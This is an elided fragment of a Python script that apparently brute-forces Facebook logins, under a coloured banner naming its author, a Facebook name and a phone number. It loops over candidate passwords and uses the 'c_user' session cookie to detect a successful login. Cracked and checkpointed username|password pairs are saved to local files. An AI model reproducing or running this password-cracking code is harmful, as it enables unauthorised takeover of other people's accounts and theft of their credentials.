...
........................................
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;35m Author \x1b[1;97m : \033[1;34m           \033[0;96m SHOVA X3  IRTAZA
\033[1;31m\033[1;35m Facebook\x1b[1;97m:  \033[1;35m          \033[0;96mMUHAMMAD MOSHIN
\033[1;31m\033[1;32m Connect\x1b[1;97m  : \033[1;34m          \033[0;96m923254985137
\033[1;31m\033[1;35m Status\x1b[1;97m : \033[1;35m               \033[0;93mFREE
\033[1;37m------------------------\033[1;37m------------------------ """                                              
        ...
        try:
            for pw in __chi__:
                ...
                header1 = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [M.M-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('M.M_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [M.M-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('M.M_CP.txt' , 'a').write('%s\n' % wrt)
                        break
